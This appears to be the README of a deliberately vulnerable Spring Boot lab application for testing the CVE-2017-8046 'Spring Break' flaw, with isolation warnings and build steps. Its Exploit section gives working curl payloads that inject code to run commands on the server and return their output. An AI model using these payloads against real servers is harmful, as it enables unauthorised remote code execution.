# Spring Break Vulnerable Application

This is a vulnerable application to test the exploit for the **Spring Break** vulnerability (**CVE-2017-8046**).

## WARNING!

**This application contains serious security vulnerabilities. Run it at your own risk! It is recommended using a backed-up and sheltered environment (such as a VM with a recent snapshot and host-only networking). Do not upload this application to any Internet facing servers, as they will be compromised.**

***DISCLAIMER*: I do not take responsibility for the way in which any one uses this application (SpringBreakVulnerableApp). The only purpose of this application is to be a test scenario for the Spring Break exploit and it should not be used maliciously. If your server is compromised via an installation of SpringBreakVulnerableApp it is not my responsibility, it is the responsibility of the person(s) who uploaded and installed it.**

## Vulnerability info

* **CVE-ID**: CVE-2017-8046
* **Link**: [https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8046](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-8046)
* **Description**: Malicious *PATCH* requests submitted to *spring-data-rest* servers in **Pivotal Spring Data REST** versions prior to **2.5.12**, **2.6.7**, **3.0 RC3**, **Spring Boot** versions prior to **2.0.0M4**, and **Spring Data** release trains prior to **Kay-RC3** can use specially crafted JSON data to run arbitrary Java code.

## Usage

The application can be launched with the following Maven command.

```
mvn spring-boot:run
```
A fat jar can be generated with the following Maven command.

```
mvn clean install spring-boot:repackage
```

To insert data you can use the following curl command.

```
curl -i -X POST -H "Content-Type: application/json" -d '{ "name" : "Test", "attribute" : "foo"}' http://hostname:port/entity
```

## Exploit

Probably the simplest exploit is the following request.

```
curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(java.lang.Thread).sleep(10000).x", "value" : "pwned" }]' "http://hostname:port/entity/1"
```

On Windows, the `calc.exe` process can be launched with the following request. Similar requests can be used to launch arbitrary commands.

```
curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(java.lang.Runtime).getRuntime().exec(\"calc.exe\").x", "value" : "pwned" }]' "http://hostname:port/entity/1/"
```

To obtain the output of launched commands, some "gadgets" offered by Spring Framework code can be used. Luckily, no external dependencies are required. For example, the result of `ipconfig` command can be retrieved with the following request.

```
curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"ipconfig\").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x", "value" : "pwned" }]' "http://hostname:port/entity/1/"
```

On Windows, a `cmd /c dir` command, and other similar commands, can be launched with the following request. Please note the trick used to insert the slash char avoiding the explicit value (i.e. explicit slashes are replaced with dots befor the real parsing).

```
curl --request PATCH -H "Content-Type: application/json-patch+json" -d '[{ "op" : "replace", "path" : "T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\"cmd \" + T(java.lang.String).valueOf(T(java.lang.Character).toChars(0x2F)) + \"c dir\").getInputStream(), T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()).x", "value" : "pwned" }]' "http://hostname:port/entity/1/"
```

A Java program to exploit this vulnerability can be found [here](https://github.com/m3ssap0/spring-break_cve-2017-8046).

## Authors

* **Antonio Francesco Sardella** - *implementation* - [m3ssap0](https://github.com/m3ssap0)

## License

This project is licensed under the MIT License - see the **LICENSE.txt** file for details.

## Acknowledgments

* [Man Yue Mo](https://lgtm.com/blog/spring_data_rest_CVE-2017-8046_ql) the security researcher who discovered the vulnerability